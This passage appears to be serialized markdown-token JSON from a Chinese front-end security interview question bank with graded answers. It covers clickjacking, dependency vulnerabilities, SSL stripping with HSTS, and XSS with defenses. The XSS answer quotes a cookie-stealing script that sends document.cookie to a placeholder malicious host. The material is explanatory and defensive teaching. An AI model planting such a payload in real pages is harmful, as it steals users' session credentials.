\\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","tokens":[{"type":"text","raw":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。","text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、将我们的页面放入到 iframe 当中。","text":"2、将我们的页面放入到 iframe 当中。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。","text":"3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"4、把 iframe 设置为100%透明度。","text":"4、把 iframe 设置为100%透明度。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","text":"5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","escaped":false}]}],"text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:1** 危害：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 危害：","task":false,"loose":false,"text":"**:1** 危害：","tokens":[{"type":"text","raw":"**:1** 危害：","text":"**:1** 危害：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 危害：","text":" 危害：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","tokens":[{"type":"paragraph","raw":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","tokens":[{"type":"text","raw":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","escaped":false}]}],"text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:2** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:2** 防御：","task":false,"loose":false,"text":"**:2** 防御：","tokens":[{"type":"text","raw":"**:2** 防御：","text":"**:2** 防御：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n >2、判断当前页面是否被嵌入到 iframe 中。","tokens":[{"type":"paragraph","raw":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","tokens":[{"type":"text","raw":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","escaped":false}]}],"text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 第三方依赖包带来的问题\\n\\n","depth":2,"text":"第三方依赖包带来的问题","tokens":[{"type":"text","raw":"第三方依赖包带来的问题","text":"第三方依赖包带来的问题","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n\\n- **:1** 防御：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n\\n","task":false,"loose":true,"text":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n","tokens":[{"type":"text","raw":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n","text":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","text":" 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":true,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >使用 NSP(Node Security Platform)、Snyk 等等这类工具。","tokens":[{"type":"paragraph","raw":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","tokens":[{"type":"text","raw":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","escaped":false}]}],"text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## https 存在的风险\\n\\n","depth":2,"text":"https 存在的风险","tokens":[{"type":"text","raw":"https 存在的风险","text":"https 存在的风险","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。\\n- **:2** 过程:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。\\n","task":false,"loose":false,"text":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","tokens":[{"type":"text","raw":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","text":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","text":" 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 过程:","task":false,"loose":false,"text":"**:2** 过程:","tokens":[{"type":"text","raw":"**:2** 过程:","text":"**:2** 过程:","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 过程:","text":" 过程:","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n >2、随后浏览器向服务器发起 http 通信;  \\n >3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","tokens":[{"type":"paragraph","raw":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","tokens":[{"type":"text","raw":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；","text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、随后浏览器向服务器发起 http 通信;","text":"2、随后浏览器向服务器发起 http 通信;","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","text":"3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","escaped":false}]}],"text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  "},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:1** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":false,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","tokens":[{"type":"paragraph","raw":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","tokens":[{"type":"text","raw":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","escaped":false}]}],"text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是跨站脚本攻击（XSS）？如何防范？\\n\\n","depth":2,"text":"什么是跨站脚本攻击（XSS）？如何防范？","tokens":[{"type":"text","raw":"什么是跨站脚本攻击（XSS）？如何防范？","text":"什么是跨站脚本攻击（XSS）？如何防范？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（9 分）\\n\\n","depth":4,"text":"解答（9 分）","tokens":[{"type":"text","raw":"解答（9 分）","text":"解答（9 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n\\n- **1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。\\n- **2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。\\n- **2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。\\n- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n\\n","task":false,"loose":true,"text":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n","tokens":[{"type":"text","raw":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n\\n网站`（http://malicious - site.com）`。\\n","text":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n","text":" 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n","escaped":false},{"type":"codespan","raw":"`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`","text":"<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>"},{"type":"text","raw":"。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站","text":"。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站","escaped":false},{"type":"codespan","raw":"`（http://malicious - site.com）`","text":"（http://malicious - site.com）"},{"type":"text","raw":"。","text":"。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。\\n","task":false,"loose":true,"text":"**1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","tokens":[{"type":"text","raw":"**1：** 输入验证和过滤：<br/>\\n\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","text":"**1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 输入验证和过滤：","text":" 输入验证和过滤：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 